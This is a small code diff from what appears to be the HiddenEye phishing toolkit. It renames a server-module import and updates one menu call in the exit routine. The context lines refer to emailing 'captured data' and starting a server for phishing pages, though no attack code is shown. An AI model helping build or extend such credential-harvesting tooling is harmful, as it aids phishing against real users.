@@ -8,7 +8,7 @@
 from Defs.ImportManager.unsorted_will_be_replaced import requests, getuid, platform_os, run_command, try_to_run_command, wait, chmod, stat, pathlib_Path, copyfile, socket
 import Defs.ThemeManager.theme as theme
 import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
-import Defs.ActionManager.Server.server_menu as server_menu
+import Defs.ActionManager.Server.server_runner as server_runner
 import Defs.LocalizationManager.lang_action_manager.lang_simple_informant as localization
 import Defs.LocalizationManager.lang_global_usage as global_localization
 
@@ -44,7 +44,7 @@ def exit_message(port = 80):  # Message when HiddenEye exit
     elif choice == 'm':
         email_prompt.captured_data_email_confirmation(port)
     elif choice == 's':
-        server_menu.server_selection(port)
+        server_runner.server_selection(port)
     elif choice == 'x':
         run_command('clear')
         print(global_localization.hidden_eye_logo)
